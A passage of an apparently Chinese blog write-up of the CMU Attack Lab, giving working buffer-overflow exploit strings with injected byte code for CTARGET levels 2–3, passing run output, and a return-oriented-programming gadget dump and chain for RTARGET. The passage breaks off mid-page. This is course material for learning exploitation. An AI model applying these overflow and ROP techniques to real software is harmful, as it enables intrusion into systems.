所以我们需要将自己的代码注入进去后能够实际运行它们.</p><h4 id="注入代码的执行"><a href="#注入代码的执行" class="headerlink" title="注入代码的执行"></a>注入代码的执行</h4><p>具体的操作为: getbuf 结束后, 返回地址指向栈中. (准确的说是我们注入的字符数组) 使得我们注入的字符被解析成汇编代码并被运行. 在这段注入的代码末尾再跳转进touch2函数.</p><p>也就是说, 我们注入的字符需要实际上实现下面这段汇编代码的功能.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;注入代码需要实现的功能</span><br><span class="line">&#x2F;&#x2F;这些保存在 touch2_tmp.s 中</span><br><span class="line">mov $0x59b997fa,%rdi&#x2F;&#x2F;将cookie写入%edi寄存器</span><br><span class="line">pushq $0x4017ec&#x2F;&#x2F;将touch2首地址推入栈顶</span><br><span class="line">retq&#x2F;&#x2F;retq在执行时,将跳转touch2函数</span><br></pre></td></tr></table></figure><p>通过使用Byte Codes生成器(参看对应的讲解), 我们可以拿到这些ByteCode:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2_tmp.s &#x2F;&#x2F;使用汇编器生成二进制的可重定位目标程序touch2_tmp.o</span><br><span class="line">objdump -d touch2_tmp.o &gt;touch2_tmp.d&#x2F;&#x2F;使用objdump将目标文件得到中间文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;下面是中间文件touch2_tmp.d中的内容,有精间</span><br><span class="line">0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure><h4 id="最后的小处理"><a href="#最后的小处理" class="headerlink" title="最后的小处理"></a>最后的小处理</h4><p>我们还需要对最终的in2文件进行小小的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这是 in2.txt 文件中的内容</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>上述代码的前3行就是我们拿到的 touch2_tmp.d 中的ByteCode</p><p>4-7行是为了填充缓冲区, 事实上1-7行一共有 0x28   个字符  <span style="background-color: #252525">不信你数数</span></p><p>第8行是将getbuf函数的返回地址覆盖为第1行的地址 0x5561dc78, 这个地址是很容易拿到的.</p><p><strong>大功告成</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in2.txt&gt; out2</span><br><span class="line">.&#x2F;ctarget -i out2 -q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>第二关就过啦~~</p><hr><h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>第三题的背景依旧是test函数. 表面逻辑: 在getbuf 函数结束后跳转至 touch3 函数. 并且在touch3函数中需要调用hexmatch函数, 后者是这么一个函数: 传入一个地址, 并读取该地址存储的字符串, 这个字符串应该是与cookie相同. (不包括前缀0x).</p><p>整体的思路类似Level2, getbuf 函数结束后跳转至缓冲区中注入的代码. 在注入代码中将参数1设置为字符串的地址, 并且注入代码段结束后跳转至touch3函数. </p><p>在retq语句跳转至其他函数我们已经的轻车熟路了, 这里直接给出touch3的首地址: <code>0x4018fa</code>, 我们需要在注入代码中实现该地址的入栈, 这样注入代码的返回会读取栈顶, 从而跳转至touch3.</p><p>基本分析完毕, 现在需要考虑的只剩:</p><ol><li>注入什么字符串?</li><li>将字符串注入在哪?</li></ol><h4 id="字符串注入内容"><a href="#字符串注入内容" class="headerlink" title="字符串注入内容"></a>字符串注入内容</h4><p>我们需要将cookie转化为字符串, 这里需要注意两点: </p><ol><li>每个字符占一个字节. 使用ASCII码表示</li><li>字符串的结尾需要使用<code>\0</code>结尾</li></ol><p>在Linux平台下, 执行<code>man ascii</code>命令可以获取ASCII码表, 对应的编码很容易对照获得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie 的ASCII表述</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><h4 id="字符串注入位置"><a href="#字符串注入位置" class="headerlink" title="字符串注入位置"></a>字符串注入位置</h4><p>这里比较坑. </p><p>我们看一下 hexmatch 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hexmatch C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">   <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>()%<span class="number">100</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">   <span class="keyword">return</span> strncmo(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在对缓冲区写入的时候, 实际上的可以写入的地方包括: test函数的栈帧, getbuf函数的栈帧, 以及其他地方. 但是当我们从getbuf函数返回的时候, 原本的getbuf栈帧被回收(虽然里面的数据没有清掉) , 并且在之后分配在了hexmatch 的栈帧上. </p><p>那么栈的分配与回收仅仅是栈指针的变动, 可不可以将数据依旧储存在栈帧里面呢? 很遗憾也是不行的. 在hexmatch函数中划分了一个长度为110 的char数组, 并且将s字符串的地址设置为其中的的任意处, 这就使得你原本储存的数据<strong>有可能</strong>被覆盖掉.</p><p>于是, 我们选择将数据写入test函数的栈帧中.</p><p><strong>存疑</strong>: 可不可以将数据写入栈的其他位置? 比如栈 120 处.</p><h4 id="字节代码的编写"><a href="#字节代码的编写" class="headerlink" title="字节代码的编写"></a>字节代码的编写</h4><p>根据以上分析, 我们已经能够写出需要注入的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi      &#x2F;&#x2F;将字符串地址推入rdi 此条地址(执行代码的首地址)为0x5561dc78</span><br><span class="line">pushq $0x4018fa             &#x2F;&#x2F;touch3地址</span><br><span class="line">retq</span><br><span class="line">...补全缓冲区 28</span><br><span class="line">...缓冲区内的执行代码的首地址 (8位地址)0x5561dc78</span><br><span class="line">...储存cookie, 写入语句 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>上述1-3行, 是将会执行的代码, 包括将字符串地址设为参数1, 将touch3地址入栈, 以及返回touch3</p><p>第4行是填满缓冲区的, 1-4行总计28字节</p><p>缓冲区后属于test的栈帧, 最底处保存的是getbuf的retq返回地址, 指向执行代码的首地址.</p><p>test更往后的地方就是我们储存cookie的地方. 此处的地址即为字符串地址0x0x5561dca8</p><h4 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>1-3: 执行代码</p><p>4-7: 填充</p><p>8: 执行代码的首地址</p><p>9: 字符串地址的首地址</p><p><strong>大功告成</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in3.txt&gt; out3</span><br><span class="line">.&#x2F;ctarget -i out3 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><hr><h2 id="题解-RTARGET"><a href="#题解-RTARGET" class="headerlink" title="题解: RTARGET"></a>题解: RTARGET</h2><p>我们在上一部分利用了缓冲区溢出, 从而劫持返回地址, 将地址返回至我们期望的地址. 除此之外我们还将代码注入进缓冲区, 并通过返回地址执行这段代码. 我们还注意到了在程序的运行的过程中可能存在的内存覆盖, 因此我们规避并选取适当的地方来储存数据.</p><p>上述手段被称为 <strong>代码注入攻击</strong> (code injection attack) 已经是”莫里斯蠕虫”时代的手法了, 现代编译器使用 <strong>地址空间布局随机化</strong>(Address space layout randomization, ASLR), 栈空间代码禁止执行(增加 “可执行” 的权限位) , 与<strong>金丝雀</strong>(Canary) 等多种手段防范代码注入攻击. 对于前两种防御手段, 黑客们使用了名为 <strong>面向返回编程</strong> (Return-oriented programming, ROP) 的技巧, 仅仅使用原有代码的部分碎片拼接成待执行的代码. </p><p>本题将学习ROP来进行代码攻击. 在此之前, 有必要讲解 <em>gadgetfarm</em></p><h3 id="Gadget-Farm-的使用"><a href="#Gadget-Farm-的使用" class="headerlink" title="Gadget Farm 的使用"></a>Gadget Farm 的使用</h3><p>在rtagret中包括了一系列函数,  里面包括的一系列字节码将被我们作为碎片(gadget) 进行拼接并使用. 这些函数被称为farm函数</p><p>我们可以拿到 farm 中的小gadgets:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump rtarget &gt; farm-dump.txt</span><br></pre></td></tr></table></figure><p> 得到的文件中只有一部分是我们需要的, 删去不必要的代码后, 最终拿到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">rtarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401999:c3                   retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:b8 fb 78 90 90       mov    $0x909078fb,%eax</span><br><span class="line">  40199f:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4019d5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:c7 07 99 d1 90 90    movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:8d 87 8d d1 20 db    lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:b8 89 d1 48 c0       mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:c7 07 81 d1 84 c0    movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:c7 07 88 c2 08 c9    movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:b8 48 89 e0 c1       mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:8d 87 89 c2 00 c9    lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:c7 07 81 ce 08 db    movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:8d 87 c8 89 e0 c3    lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:8d 87 48 89 e0 c7    lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:b8 99 d1 08 d2       mov    $0xd208d199,%eax</span><br><span class="line">  401a53:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:b8 89 c2 c4 c9       mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:c7 07 48 89 e0 91    movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:8d 87 89 ce 92 c3    lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:c7 07 89 d1 91 c3    movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:c7 07 81 c2 38 d2    movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:c7 07 09 ce 08 c9    movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:8d 87 08 89 e0 90    lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:8d 87 89 c2 c7 3c    lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:b8 88 ce 20 c0       mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:c7 07 48 89 e0 c2    movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:8d 87 89 c2 60 d2    lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:b8 8d ce 20 d2       mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401ab7:c3                   retq   </span><br><span class="line">  401ab8:90                   nop</span><br><span class="line">  401ab9:90                   nop</span><br><span class="line">  401aba:90                   nop</span><br><span class="line">  401abb:90                   nop</span><br><span class="line">  401abc:90                   nop</span><br><span class="line">  401abd:90                   nop</span><br><span class="line">  401abe:90                   nop</span><br><span class="line">  401abf:90                   nop</span><br></pre></td></tr></table></figure><p>题目还提供了部分汇编指令的对应的字节表示:</p><p><img src="../../Lab-Notes/img/Byte encoding of instructions.png" alt="byte coding"></p><h3 id="RLevel2"><a href="#RLevel2" class="headerlink" title="RLevel2"></a>RLevel2</h3><p>题目本身与Ctarget一致, 区别在于源代码编译的过程中使用了ASLR与禁止栈执行. 笔记中前缀 R 以示区分.</p><p>先来回顾一下我们在Level2中干了什么, 我们将代码注入了缓冲区, 并运行之, 从而使得cookie写入rdi寄存器. </p><p>在本题中, 我们选择先将 cookie 存入栈中, 然后使用 pop 指令将cookie推入$rdi 寄存器.</p><p>然而很遗憾, farm中并没有 <code>pop $rdi</code>对应的指令 5f , 倒是 <code>pop $rax</code> 对应的58指令频繁出现, 我们于是考虑迂回作战, 先将cookie推入rax, 再使用 <code>mov $rax,$rdi</code> 完成目标.</p><p>farm中有很多条路径可以实现上述目标, 我选择的是 <code>&lt;getval_280&gt;</code> 与 <code>&lt;setval_426&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq  </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019cc</span><br><span class="line">58 : pop $rax </span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019c5</span><br><span class="line">48 89 c7 : mov $rax,$rdi</span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>因此图解如下: </p><p><img src="../../Lab-Notes/img/Rtouch2_pic.png" alt="Rtouch2_pic"></p><p>答案为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 